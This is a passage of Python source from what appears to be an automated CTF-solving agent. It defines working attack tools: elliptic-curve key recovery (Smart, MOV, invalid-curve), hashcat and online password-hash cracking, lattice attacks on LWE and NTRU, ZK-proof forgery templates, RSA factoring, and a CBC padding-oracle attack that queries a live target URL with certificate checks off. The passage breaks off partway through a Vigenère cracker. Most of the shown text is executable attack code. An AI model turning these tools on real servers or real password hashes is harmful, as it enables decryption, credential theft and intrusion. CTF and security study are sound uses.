        x_lift = E_K.base_field()(ZZ(x))
        # y^2 = x^3 + ax + b (mod p^2), solve for y lift
        rhs = x_lift**3 + E_K.a4()*x_lift + E_K.a6()
        y_lift = rhs.sqrt()
        if ZZ(y_lift) % p != ZZ(y):
            y_lift = -y_lift
        return E_K(x_lift, y_lift)
    try:
        G_lift = hensel_lift(G, EK, p)
        P_lift = hensel_lift(P, EK, p)
        pG = p * G_lift
        pP = p * P_lift
        # Log via formal group
        xpG = -pG[0]/pG[1]; xpP = -pP[0]/pP[1]
        k = (ZZ(xpP) // p) * inverse_mod(ZZ(xpG) // p, p) % p
        print(f"Smart's attack result: k = {{k}}")
        print(f"Verify: {{k}}*G == P ? {{k*G == P}}")
    except Exception as ex:
        print(f"Hensel lift failed: {{ex}}")
        print("Trying sage built-in discrete_log...")
        k = G.discrete_log(P)
        print(f"discrete_log result: k = {{k}}")
except ImportError:
    print("SageMath not available — Smart's attack requires SageMath")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "mov":
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0); k = params.get("k", 2)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy,Px,Py,k = {Gx},{Gy},{Px},{Py},{k}
    F = GF(p); E = EllipticCurve(F,[a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    n = G.order()
    # MOV attack: embed DLP into Fp^k via Weil/Tate pairing
    Fext = GF(p**k, 'z')
    # Use Tate pairing (available in Sage)
    try:
        eG = G.tate_pairing(G, n, k)
        eP = G.tate_pairing(P, n, k)
        print(f"Tate pairing e(G,G) = {{eG}}")
        print(f"Tate pairing e(G,P) = {{eP}}")
        # DLP in Fp^k: find l s.t. eG^l == eP
        l = eG.log(eP)
        print(f"MOV result: l = {{l}}")
        print(f"Verify: l*G == P ? {{l*G == P}}")
    except Exception as ex:
        print(f"Tate pairing error: {{ex}}")
        print("Trying discrete_log fallback...")
        l = discrete_log(eP, eG, n)
        print(f"DLP result: l = {{l}}")
except ImportError:
    print("SageMath required for MOV attack")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "invalid_curve":
        # Invalid curve attack: server uses point without curve membership check
        p = params.get("p",0); a = params.get("a",0)
        n = params.get("n",0)  # target key bit length estimate
        code = f"""
# Invalid curve attack skeleton
# Server accepts any (x,y) as a valid curve point without checking membership
# We send points on related curves with small-order subgroups
# and use CRT to recover the private key
print("Invalid Curve Attack template:")
print()
print("1. Find low-order points on nearby curves (same p, same a, different b):")
print("   For each small prime l dividing nearby curve orders:")
print("     Find point P_l of order l on curve y^2 = x^3 + ax + b_i")
print()
print("2. Send P_l to server's scalar-mult endpoint")
print("   If server doesn't check b: d * P_l ≡ r * P_l (mod l) reveals d mod l")
print()
print("3. CRT-combine residues to recover full d")
print()
p,a = {p},{a}
if p and a:
    code = '''
from sage.all import *
p,a = ''' + str(p) + ''',''' + str(a) + '''
small_order_points = []
for b in range(1, 1000):
    try:
        E = EllipticCurve(GF(p), [a, b])
        card = E.order()
        from sage.all import factor
        for fac, exp in list(factor(card)):
            if fac < 10000:
                cofac = card // (fac**exp)
                G = cofac * E.random_point()
                if G != E(0) and fac*G == E(0):
                    print(f"b={b}, order={fac}, point=({G.xy()[0]},{G.xy()[1]})")
                    small_order_points.append((b, int(fac), int(G.xy()[0]), int(G.xy()[1])))
    except: pass
    if len(small_order_points) >= 8:
        break
print(f"Found {len(small_order_points)} small-order points")
'''
    import subprocess
    r = subprocess.run(['sage','-c', code], capture_output=True, text=True, timeout=60)
    print(r.stdout or r.stderr)
"""
        return tool_execute_python(code, timeout=90)

    if operation == "pohlig_hellman":
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy,Px,Py = {Gx},{Gy},{Px},{Py}
    E = EllipticCurve(GF(p),[a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    n = G.order()
    print(f"Order n = {{n}}, factored: {{factor(n)}}")
    # Pohlig-Hellman via Sage
    k = G.discrete_log(P)
    print(f"DLP result: k = {{k}}")
    print(f"Verify: k*G == P ? {{k*G == P}}")
except ImportError:
    print("SageMath required")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    return ("ECC special attacks tool. Operations:\n"
            "  detect          — identify which attack applies (needs p,a,b,n)\n"
            "  smart           — Smart's attack for #E==p (needs p,a,b,Gx,Gy,Px,Py)\n"
            "  mov             — MOV/FR attack for low embedding degree (needs p,a,b,Gx,Gy,Px,Py,k)\n"
            "  invalid_curve   — generate small-order points on nearby curves (needs p,a)\n"
            "  pohlig_hellman  — smooth-order DLP via CRT (needs p,a,b,Gx,Gy,Px,Py)")


def tool_hash_crack(hash_value: str, operation: str = "auto",
                    wordlist: str = "rockyou", hash_type: str = "") -> str:
    """Identify and crack hashes via hashcat wordlist/bruteforce + online API fallback.
    Ops: auto (identify then try all), identify (type detection only),
    wordlist (hashcat -a 0 rockyou.txt), bruteforce (hashcat -a 3 short masks),
    online_lookup (hashes.com / crackstation HTTP query)."""

    hv = hash_value.strip()

    # ── identify hash type ────────────────────────────────────────────────────
    def _identify(h):
        l = len(h)
        hints = []
        if re.fullmatch(r'[0-9a-fA-F]{32}', h):  hints.append("MD5 (hashcat -m 0)")
        if re.fullmatch(r'[0-9a-fA-F]{40}', h):  hints.append("SHA1 (hashcat -m 100)")
        if re.fullmatch(r'[0-9a-fA-F]{56}', h):  hints.append("SHA224 (hashcat -m 1300)")
        if re.fullmatch(r'[0-9a-fA-F]{64}', h):  hints.append("SHA256 (hashcat -m 1400)")
        if re.fullmatch(r'[0-9a-fA-F]{96}', h):  hints.append("SHA384 (hashcat -m 10800)")
        if re.fullmatch(r'[0-9a-fA-F]{128}', h): hints.append("SHA512 (hashcat -m 1700)")
        if re.fullmatch(r'\$2[aby]\$.{56}', h):   hints.append("bcrypt (hashcat -m 3200)")
        if re.fullmatch(r'[0-9a-fA-F]{32}:[0-9a-fA-F]{32}', h): hints.append("NTLM (hashcat -m 1000)")
        if h.startswith('$6$'):                   hints.append("sha512crypt (hashcat -m 1800)")
        if h.startswith('$5$'):                   hints.append("sha256crypt (hashcat -m 7400)")
        if h.startswith('$1$'):                   hints.append("md5crypt (hashcat -m 500)")
        if not hints:                             hints.append(f"Unknown — length {l}")
        return "; ".join(hints)

    if operation == "identify":
        return _identify(hv)

    # ── online lookup ─────────────────────────────────────────────────────────
    def _online(h):
        results = []
        try:
            import urllib.request
            # CrackStation
            req = urllib.request.Request(
                "https://crackstation.net/api/",
                data=urllib.parse.urlencode({"hash": h, "format": "json"}).encode(),
                headers={"User-Agent": "CTF-Solver/1.0",
                         "Content-Type": "application/x-www-form-urlencoded"})
            with urllib.request.urlopen(req, timeout=10) as r:
                j = json.loads(r.read())
            if isinstance(j, list) and j and j[0].get("cracked"):
                results.append(f"[CrackStation] {j[0]['hash']} => {j[0]['password']}")
        except Exception as ex:
            results.append(f"[CrackStation] error: {ex}")
        try:
            req2 = urllib.request.Request(
                f"https://hashes.com/en/api/identifyandsearch?hashtext={urllib.parse.quote(h)}",
                headers={"User-Agent": "CTF-Solver/1.0"})
            with urllib.request.urlopen(req2, timeout=10) as r:
                j2 = json.loads(r.read())
            if j2.get("found"):
                results.append(f"[hashes.com] {h} => {j2.get('plaintext','?')}")
        except Exception as ex:
            results.append(f"[hashes.com] error: {ex}")
        return "\n".join(results) if results else "No online result"

    if operation == "online_lookup":
        return _online(hv)

    # ── hashcat wordlist ──────────────────────────────────────────────────────
    def _hashcat(h, ht, mode):
        # map friendly names to hashcat -m codes
        type_map = {"md5":"0","sha1":"100","sha224":"1300","sha256":"1400",
                    "sha384":"10800","sha512":"1700","ntlm":"1000","bcrypt":"3200",
                    "md5crypt":"500","sha512crypt":"1800","sha256crypt":"7400"}
        if ht in type_map:
            m_flag = type_map[ht]
        else:
            # auto-detect
            l = len(h)
            m_flag = {32:"0",40:"100",64:"1400",128:"1700"}.get(l,"0")

        wl_paths = ["/usr/share/wordlists/rockyou.txt",
                    "/usr/share/wordlists/rockyou.txt.gz",
                    "/opt/rockyou.txt", "/tmp/rockyou.txt"]
        wl = next((p for p in wl_paths if os.path.exists(p)), "")

        tmp_hash = f"/tmp/hc_hash_{int(time.time())}.txt"
        tmp_out  = f"/tmp/hc_out_{int(time.time())}.txt"
        try:
            with open(tmp_hash, "w") as f: f.write(h + "\n")
            if mode == "wordlist":
                if not wl:
                    return "rockyou.txt not found — trying online lookup\n" + _online(h)
                cmd = f"hashcat -m {m_flag} -a 0 '{tmp_hash}' '{wl}' --potfile-disable -o '{tmp_out}' --quiet 2>&1; cat '{tmp_out}' 2>/dev/null"
            else:  # bruteforce masks
                masks = "?a?a?a?a?a?a?a?a"
                cmd = (f"hashcat -m {m_flag} -a 3 '{tmp_hash}' {masks} "
                       f"--potfile-disable -o '{tmp_out}' --quiet 2>&1; cat '{tmp_out}' 2>/dev/null")
            out = _shell(cmd, timeout=180)
            if os.path.exists(tmp_out):
                cracked = open(tmp_out).read().strip()
                if cracked:
                    parts = cracked.split(":")
                    pw = ":".join(parts[1:]) if len(parts) > 1 else cracked
                    return f"[CRACKED] {h} => {pw}"
            return out or "Not cracked by hashcat"
        finally:
            for f in (tmp_hash, tmp_out):
                try: os.remove(f)
                except: pass

    if operation == "wordlist":
        ht = hash_type or ""
        return _hashcat(hv, ht, "wordlist")

    if operation == "bruteforce":
        ht = hash_type or ""
        return _hashcat(hv, ht, "bruteforce")

    # ── auto: identify → online → wordlist ───────────────────────────────────
    identified = _identify(hv)
    log("sys", f"[hash_crack] identified: {identified}", "dim")
    online_result = _online(hv)
    if "=>" in online_result:
        return f"Type: {identified}\n{online_result}"
    hc_result = _hashcat(hv, hash_type, "wordlist")
    return f"Type: {identified}\nOnline: {online_result}\nHashcat: {hc_result}"


def tool_pqc_attack(operation: str = "detect", **params) -> str:
    """Post-quantum crypto attacks: detect (weak params), lwe_attack (primal/dual reduction),
    ntru_attack (key recovery), kyber_fault (fault injection model), dilithium_nonce (biased signing)."""

    if operation == "detect":
        code = f"""
try:
    from sage.all import *
    n = {params.get('n', 0)}
    q = {params.get('q', 0)}
    if not (n and q):
        print("Provide n (dimension) and q (modulus) to detect weak params")
        print("\\nLWE parameter security heuristics:")
        print("  n<256, q<1024: likely breakable with lattice reduction")
        print("  q/n ratio < 8: high error rate, might be distinguishable")
        print("  q not prime: unusual, check for structure")
        print("  Gaussian width sigma: if sigma*sqrt(n) > q/4, decryption errors")
    else:
        print(f"n={{n}}, q={{q}}, log2(q)={{float(log(q,2)):.1f}}")
        # BKZ blocksize estimate for primal attack
        delta = (n * log(q) / (2 * n + n)) ** (1/(2*n))
        bkz_beta = round(float(0.2075 * log(q) * n))
        print(f"Estimated BKZ beta for primal attack: {{bkz_beta}}")
        if bkz_beta < 60:
            print("[!] WEAK: BKZ beta < 60 — breakable with standard LLL/BKZ")
        elif bkz_beta < 100:
            print("[!] MARGINAL: BKZ beta 60-100 — breakable with BKZ-2.0 + sieving")
        else:
            print(f"[OK] beta={{bkz_beta}} — appears secure against known lattice attacks")
        # Check for special structure
        if n & (n-1) == 0:
            print(f"[!] n={{n}} is power-of-2: NTT-friendly, check for ring-LWE vs plain LWE")
        if q % (2*n) == 1:
            print(f"[!] q ≡ 1 (mod 2n): NTT-compatible, Kyber/Dilithium-like structure")
except ImportError:
    print("SageMath not available. Manual checks:")
    n, q = {params.get('n',0)}, {params.get('q',0)}
    if n and q:
        import math
        print(f"n={n}, q={q}, log2(q)={math.log2(q):.1f}")
        print(f"n power-of-2: {n & (n-1) == 0}")
        print(f"q % (2n) == 1: {q % (2*n) == 1 if n else 'N/A'}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "lwe_attack":
        n = params.get('n', 0); q = params.get('q', 0)
        samples = params.get('samples', [])  # list of (a, b) pairs
        code = f"""
try:
    from sage.all import *
    n, q = {n}, {q}
    samples = {samples}
    if not samples:
        print("LWE attack templates (provide samples=[(a_vector, b_scalar), ...])")
        print()
        print("Primal attack (BDD → uSVP):")
        print("  Build lattice from A matrix and b vector")
        print("  Apply BKZ reduction, find short vector = secret + error")
        print()
        print("Dual attack (distinguish LWE from random):")
        print("  Find short vector w s.t. w·A ≡ 0 (mod q)")
        print("  Compute w·b mod q — if LWE, biased around w·s·noise")
        print()
        print("Sage template for m=n+1 samples:")
        print('''
from sage.all import *
n, q = {n or 8}, {q or 17}
# A is m×n, b = A*s + e (mod q)
A = Matrix(ZZ, [[...]])  # your sample vectors
b = vector(ZZ, [...])    # your b values
# Build embedding lattice [q*I | 0; A | I; b | 1]
# Then BKZ to find short vector containing s
        ''')
    else:
        from sage.all import Matrix, vector, ZZ, GF, identity_matrix, zero_matrix, block_matrix
        m = len(samples)
        A_rows = [list(s[0]) for s in samples]
        b_vec = [s[1] for s in samples]
        A = Matrix(ZZ, A_rows)
        b = vector(ZZ, b_vec)
        # Kannan embedding
        B = block_matrix(ZZ, [[q * identity_matrix(n), zero_matrix(n, m+1)],
                               [A.T, identity_matrix(m), zero_matrix(m, 1)],
                               [b, zero_matrix(1, m), Matrix(ZZ, [[1]])]])
        print(f"Lattice built: {{B.nrows()}}x{{B.ncols()}}")
        print("Applying LLL (BKZ-2.0 for full attack)...")
        L = B.LLL()
        for row in L.rows()[:5]:
            if max(abs(x) for x in row[:n]) < q//4:
                print(f"Candidate secret: {{list(row[:n])}}")
                break
        else:
            print("LLL insufficient — try BKZ with higher blocksize or more samples")
except ImportError:
    print("SageMath required for LWE attack")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "ntru_attack":
        N = params.get('N', 0); p = params.get('p', 3); q_ntru = params.get('q', 0)
        h = params.get('h', '')
        code = f"""
try:
    from sage.all import *
    N, p, q = {N}, {p}, {q_ntru}
    h_coeffs = {h if h else '[]'}
    if not (N and q):
        print("NTRU attack templates. Provide N, p, q parameters.")
        print("\\nNTRU lattice attack:")
        print("  Public key h = f*g^-1 (mod q) in ring Z[X]/(X^N - 1)")
        print("  Build 2N×2N lattice: [[q*I, 0], [H, I]]")
        print("  Rotate h → H (circulant matrix)")
        print("  LLL finds short vector = (f, g) if ||f||,||g|| << q/2")
        print()
        print(f"Security: key space ~= q^N, LLL attack works when N < 250 and q small")
    else:
        from sage.all import Matrix, ZZ, identity_matrix, zero_matrix
        if h_coeffs:
            # Build circulant matrix H from h
            h_list = list(h_coeffs)
            H = Matrix(ZZ, N, N, lambda i,j: h_list[(j-i) % N])
            # NTRU lattice
            L = block_matrix(ZZ, [[q*identity_matrix(N), zero_matrix(N,N)],
                                   [H, identity_matrix(N)]])
            print(f"NTRU lattice: {{L.nrows()}}x{{L.ncols()}}")
            print("Running LLL...")
            R = L.LLL()
            # First short rows are likely (f, g) candidates
            for row in R.rows()[:3]:
                f_cand = list(row[:N]); g_cand = list(row[N:])
                if all(abs(x) <= p for x in f_cand):
                    print(f"f candidate (small): {{f_cand[:10]}}...")
                    print(f"g candidate: {{g_cand[:10]}}...")
                    break
        else:
            print("Provide h (public key polynomial coefficients) as list")
except ImportError:
    print("SageMath required")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "kyber_fault":
        return f"[kyber_fault] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "zkp_attack":
        return tool_zkp_attack("detect", **params)

    return "Operations: detect, lwe_attack, ntru_attack, kyber_fault, zkp_attack"


def tool_zkp_attack(operation: str = "detect", **params) -> str:
    """ZK proof system attacks: detect (identify system + weak points),
    null_constraint (unsatisfied constraint → forge proof), weak_fiat_shamir (replay/predict challenge),
    trusted_setup (toxic waste extraction), plonk_malleability, groth16_malleability."""

    if operation == "detect":
        circuit_code = params.get("circuit_code", "")
        return ("ZK Proof System Attack Detector:\n\n"
                "== Identifying the proof system ==\n"
                "Look for: .circom/.r1cs files (Circom/Groth16/PLONK)\n"
                "         .zkey files (trusted setup keys)\n"
                "         .sol with Verifier contract (on-chain ZK)\n"
                "         snarkjs, bellman, arkworks, gnark imports\n\n"
                "== Attack 1: Null/Under-constrained signals (most common CTF vuln) ==\n"
                "  In Circom: signal that appears only as output, never in constraint\n"
                "  Effect: prover can set it to ANY value and proof still verifies\n"
                "  Find: grep for 'signal output' / 'signal private input' with no === constraint\n"
                "  Exploit: use snarkjs to generate witness with modified signal value\n\n"
                "== Attack 2: Weak Fiat-Shamir (if challenge is predictable) ==\n"
                "  Verifier uses block.timestamp or predictable randomness as challenge\n"
                "  Exploit: precompute response for expected challenge\n\n"
                "== Attack 3: Trusted Setup (powers-of-tau leakage) ==\n"
                "  If CTF 'forgets' to destroy toxic waste (tau)\n"
                "  Given tau: forge any proof for any statement\n"
                "  Check: does the CTF give you the .ptau file + ceremony transcript?\n\n"
                "== Attack 4: Groth16 malleability ==\n"
                "  Proof (A,B,C) can be rerandomized: A'=r*A, B'=B/r, C'=C+delta\n"
                "  Use to: replay proof for different public input if verifier doesn't check\n\n"
                "== Attack 5: PLONK/SNARK proof extraction ==\n"
                "  If public inputs include secret-derived value with weak range check\n"
                "  Use knowledge extractor (2 proofs same statement, different randomness)\n\n"
                "Common Circom bugs to grep for:\n"
                "  - IsZero component used without checking output\n"
                "  - Num2Bits without range check → overflow\n"
                "  - LessThan/GreaterThan with n > 252 bits → overflow\n"
                "  - Unused output signals")

    if operation == "null_constraint":
        circuit = params.get("circuit_code", "")
        code = f"""
import re
circuit = {repr(circuit)}
if not circuit:
    print("Provide circuit_code (Circom source)")
    print()
    print("Manual check for under-constrained signals:")
    print("1. List all signal declarations: grep 'signal'")
    print("2. List all constraints: grep '==='")
    print("3. Any signal not in any === constraint is under-constrained")
    print()
    print("Exploit template (snarkjs):")
    print('''
// After finding under-constrained output signal 'result':
const witness = await snarkjs.wtns.calculate(
    {{ ...normalInputs, result: BigInt("FORGED_VALUE") }},
    "circuit.wasm", {{ type: "mem" }}
);
const {{ proof, publicSignals }} = await snarkjs.groth16.prove("circuit.zkey", witness);
console.log(await snarkjs.groth16.verify(vKey, publicSignals, proof));  // true!
    ''')
else:
    signals = re.findall(r'signal\\s+(?:input|output|private)?\\s*(\\w+)', circuit)
    constraints = re.findall(r'(\\w+)\\s*===', circuit)
    constrained = set(constraints)
    for sig in signals:
        if sig not in constrained:
            print(f"[UNDER-CONSTRAINED] {{sig}} — never appears in === constraint!")
    print(f"\\nTotal signals: {{len(signals)}}, Constrained: {{len(constrained)}}")
    # Check IsZero usage
    if 'IsZero' in circuit and 'IsZero().out ===' not in circuit:
        print("[!] IsZero used but output may not be constrained")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "weak_fiat_shamir":
        return f"[weak_fiat_shamir] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "groth16_malleability":
        return f"[groth16_malleability] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: detect, null_constraint, weak_fiat_shamir, groth16_malleability"


def tool_rsa_toolkit(operation: str = "auto", n: str = "", e: str = "65537",
                     c: str = "", p: str = "", q: str = "",
                     factors: list = None, moduli: list = None,
                     output_file: str = "") -> str:
    """RSA attack toolkit wrapping RsaCtfTool (github.com/RsaCtfTool/RsaCtfTool).
    Ops: auto (try all attacks), fermat (p≈q factoring), wiener (small d),
    hastads (small e broadcast), common_modulus, batch_gcd (factor N from list of moduli),
    multiprime (3+ prime factors), twin_prime, factor_only (return p,q without decrypt).
    Falls back to sympy/gmpy2 pure-Python for fermat+batch_gcd when RsaCtfTool missing."""

    def _rsactftool(args):
        # Try installed command first, then common paths
        for cmd in ["RsaCtfTool", "rsactftool", "python3 /opt/RsaCtfTool/RsaCtfTool.py",
                    "python3 ~/RsaCtfTool/RsaCtfTool.py"]:
            result = _shell(f"{cmd} {args} 2>&1", timeout=60)
            if "not found" not in result and "No such" not in result:
                return result
        return None

    # Pure-Python fallbacks using sympy/gmpy2
    def _fermat_py(n_int):
        code = f"""
import math, sympy
n = {n_int}
a = math.isqrt(n) + 1
b2 = a*a - n
while True:
    b = math.isqrt(b2)
    if b*b == b2:
        p, q = a-b, a+b
        if p*q == n:
            print(f'p = {{p}}')
            print(f'q = {{q}}')
            break
    a += 1
    b2 = a*a - n
    if a - math.isqrt(n) > 10**6:
        print('Fermat failed after 10^6 iterations — p and q not close')
        break
"""
        return tool_execute_python(code, timeout=30)

    def _batch_gcd_py(moduli_list):
        code = f"""
from math import gcd
moduli = {moduli_list}
print(f'Checking {{len(moduli)}} moduli for shared factors...')
for i in range(len(moduli)):
    for j in range(i+1, len(moduli)):
        g = gcd(moduli[i], moduli[j])
        if g > 1 and g != moduli[i]:
            print(f'[!] GCD(N[{{i}}], N[{{j}}]) = {{g}}')
            print(f'    p = {{g}}')
            print(f'    q_i = {{moduli[i]//g}}')
            print(f'    q_j = {{moduli[j]//g}}')
"""
        return tool_execute_python(code, timeout=30)

    if not n and operation not in ("batch_gcd",):
        return "Provide n= (and e=, c= for decryption)"

    n_int = int(n, 0) if n and n.startswith("0x") else int(n) if n else 0

    if operation == "fermat":
        r = _rsactftool(f"-n {n} -e {e} --attack fermat --decrypt {c}" if c else
                        f"-n {n} --attack fermat")
        return r if r else _fermat_py(n_int)

    if operation == "batch_gcd":
        ml = moduli or []
        if not ml: return "Provide moduli=[n1,n2,...] list"
        r = _rsactftool(f"--attack batch_gcd " + " ".join(f"-n {m}" for m in ml))
        return r if r else _batch_gcd_py([int(m,0) if str(m).startswith("0x") else int(m) for m in ml])

    if operation == "wiener":
        r = _rsactftool(f"-n {n} -e {e} --attack wiener" + (f" --decrypt {c}" if c else ""))
        return r if r else _shell(f"python3 -c \"from sympy.ntheory.factor_ import factorint; print(factorint({n}))\"", timeout=30)

    if operation == "hastads":
        return _rsactftool(f"-n {n} -e {e} --attack hastads" + (f" --decrypt {c}" if c else "")) or \
               "RsaCtfTool not found. Install: pip install rsactftool"

    if operation == "common_modulus":
        return _rsactftool(f"-n {n} -e {e} --attack common_modulus") or \
               "RsaCtfTool not found. Install: pip install rsactftool"

    if operation == "multiprime":
        fs = factors or []
        if fs:
            code = f"""
from Crypto.Util.number import inverse
n,e,c = {n_int},{int(e)},{int(c,0) if c and c.startswith('0x') else int(c) if c else 0}
factors = {[int(f,0) if str(f).startswith('0x') else int(f) for f in fs]}
phi = 1
for f in factors: phi *= (f-1)
d = inverse(e, phi)
m = pow(c, d, n)
import binascii
try: print('Plaintext:', binascii.unhexlify(hex(m)[2:].zfill(len(hex(m)[2:]) + len(hex(m)[2:])%2)).decode(errors='replace'))
except: print('m =', m)
"""
            return tool_execute_python(code, timeout=10)
        return _rsactftool(f"-n {n} -e {e} --attack factordb,smallfactor" + (f" --decrypt {c}" if c else "")) or \
               "Provide factors= list or install RsaCtfTool for auto-factoring"

    if operation == "factor_only":
        r = _rsactftool(f"-n {n} --attack fermat,factordb,smallfactor,wiener")
        return r if r else _fermat_py(n_int)

    # auto — try all attacks
    r = _rsactftool(f"-n {n} -e {e}" + (f" --decrypt {c}" if c else "") + " --attack all")
    return r if r else (f"RsaCtfTool not installed.\nInstall: pip install rsactftool\nFermat fallback:\n" + _fermat_py(n_int))


def tool_cbc_oracle(operation: str = "decrypt", target_url: str = "",
                    ciphertext_hex: str = "", block_size: int = 16,
                    oracle_param: str = "cipher", method: str = "POST",
                    encoding: str = "hex", headers: dict = None,
                    cookies: dict = None, known_plaintext: str = "") -> str:
    """CBC padding oracle attack wrapping padbuster / paddingoracle.
    Ops: decrypt (recover plaintext byte-by-byte via padding oracle),
    encrypt (encrypt arbitrary plaintext via oracle — block-by-block),
    probe (verify oracle is working — check padding error vs success response),
    padbuster (shell to padbuster CLI for full automation)."""

    sp = target_url
    ct = ciphertext_hex.replace(" ", "").replace(":", "")

    if operation == "padbuster":
        if not target_url or not ct:
            return "Provide target_url= and ciphertext_hex="
        enc_map = {"hex": "0", "base64": "1", "base64url": "2", "netescaped": "3"}
        enc = enc_map.get(encoding, "0")
        cmd = f"padbuster '{target_url}' '{ct}' {block_size} -encoding {enc}"
        if method == "POST": cmd += f" -post '{oracle_param}=CIPHERTEXT'"
        result = _shell(cmd, timeout=300)
        if "command not found" in result or "not found" in result:
            return "padbuster not installed. Install: apt install padbuster\nAlternative: pip install paddingoracle"
        return result

    if operation == "probe":
        code = f"""
import requests, binascii
url = {repr(target_url)}
ct = bytes.fromhex({repr(ct)})
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
# Try with valid ciphertext vs corrupted last byte
def oracle(cipher_bytes):
    if {repr(method)} == 'POST':
        r = requests.post(url, data={{'{oracle_param}': cipher_bytes.hex()}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
    else:
        r = requests.get(url, params={{'{oracle_param}': cipher_bytes.hex()}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
    return r.status_code, len(r.text), r.text[:100]

valid_status, valid_len, _ = oracle(ct)
# Corrupt last byte
corrupt = bytearray(ct)
corrupt[-1] ^= 0xFF
bad_status, bad_len, bad_text = oracle(bytes(corrupt))
print(f'Valid:   status={{valid_status}} len={{valid_len}}')
print(f'Corrupt: status={{bad_status}} len={{bad_len}} preview={{bad_text[:60]}}')
if valid_status != bad_status or valid_len != bad_len:
    print('[+] Oracle CONFIRMED — distinguishable response')
else:
    print('[-] Cannot distinguish — oracle may not work or check response body')
"""
        return tool_execute_python(code, timeout=20)

    if operation in ("decrypt", "encrypt"):
        code = f"""
import requests, binascii
url = {repr(target_url)}
ct_hex = {repr(ct)}
block_size = {block_size}
method = {repr(method)}
param = {repr(oracle_param)}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}

try:
    from paddingoracle import BadPaddingException, PaddingOracle
    class MyOracle(PaddingOracle):
        def oracle(self, data, **kwargs):
            if method == 'POST':
                r = requests.post(url, data={{param: data.hex()}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
            else:
                r = requests.get(url, params={{param: data.hex()}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
            if r.status_code == 500 or 'padding' in r.text.lower() or 'invalid' in r.text.lower():
                raise BadPaddingException
    
    padbuster = MyOracle()
    ct_bytes = bytes.fromhex(ct_hex)
    if '{operation}' == 'decrypt':
        plaintext = padbuster.decrypt(ct_bytes, block_size=block_size)
        print(f'Decrypted: {{repr(plaintext)}}')
        try: print(f'ASCII: {{plaintext.decode()}}')
        except: pass
    else:
        pt = {repr(known_plaintext)}.encode()
        encrypted = padbuster.encrypt(pt, block_size=block_size)
        print(f'Encrypted: {{encrypted.hex()}}')
except ImportError:
    print('paddingoracle not installed. Install: pip install paddingoracle')
    print('Alternative: use padbuster CLI with operation=padbuster')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=300)

    return "Operations: decrypt, encrypt, probe, padbuster"


def tool_vigenere_crack(ciphertext: str, operation: str = "crack",
                        key_length: int = 0, known_key: str = "") -> str:
    """Automated Vigenere cipher cracking using Kasiski test + Index of Coincidence.
    Ops: crack (auto find key length + recover key + decrypt),
    kasiski (find repeated trigrams to estimate key length),
    ic_key_length (Index of Coincidence analysis for key length),
    recover_key (given key length, recover key by per-column frequency analysis)."""

    ct = re.sub(r'[^a-zA-Z]', '', ciphertext).upper()

    if operation == "kasiski":
        code = f"""
import re
from collections import Counter
ct = {repr(ct)}
# Find repeated trigrams and their distances
spacings = []
for i in range(len(ct)-2):
    trig = ct[i:i+3]
    for j in range(i+3, len(ct)-2):
        if ct[j:j+3] == trig:
            spacings.append(j-i)
if not spacings:
    print('No repeated trigrams found')
else:
    from math import gcd
    from functools import reduce
    factors = Counter()
    for s in spacings:
        for k in range(2, min(s+1, 20)):
            if s % k == 0: factors[k] += 1
    print('Likely key lengths (Kasiski):')
    for kl, cnt in sorted(factors.items(), key=lambda x:-x[1])[:8]:
        print(f'  length {{kl}}: {{cnt}} spacing matches')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "ic_key_length":
        code = f"""
ct = {repr(ct)}
def ic(text):
    from collections import Counter
    n = len(text)
    if n < 2: return 0
    c = Counter(text)
    return sum(v*(v-1) for v in c.values()) / (n*(n-1))
print('Index of Coincidence by key length:')
for kl in range(1, 20):
    cols = [''.join(ct[i::kl]) for i in range(kl)]
    avg_ic = sum(ic(col) for col in cols) / kl
    flag = ' <-- likely' if avg_ic > 0.060 else ''
    print(f'  kl={{kl:2d}}  IC={{avg_ic:.4f}}{flag}')
print('(English IC ≈ 0.065, random ≈ 0.038)')
"""
        return tool_execute_python(code, timeout=10)

    if operation in ("recover_key", "crack"):
        code = f"""
from collections import Counter
import itertools
ct = {repr(ct)}
kl = {key_length} if {key_length} else None

def ic(text):
    n = len(text)
    if n < 2: return 0
    c = Counter(text)
    return sum(v*(v-1) for v in c.values()) / (n*(n-1))

# Find key length if not given
if not kl:
    best_kl, best_ic = 1, 0
    for k in range(1, 20):
        cols = [''.join(ct[i::k]) for i in range(k)]
        avg_ic = sum(ic(col) for col in cols) / k
        if avg_ic > best_ic:
            best_ic, best_kl = avg_ic, k
    kl = best_kl
    print(f'Best key length: {{kl}} (IC={{best_ic:.4f}})')

# English letter frequencies
EN_FREQ = [0.0817,0.0149,0.0278,0.0425,0.1270,0.0222,0.0202,0.0609,0.0697,
           0.0015,0.0077,0.0402,0.0241,0.0675,0.0751,0.0193,0.0010,0.0599,
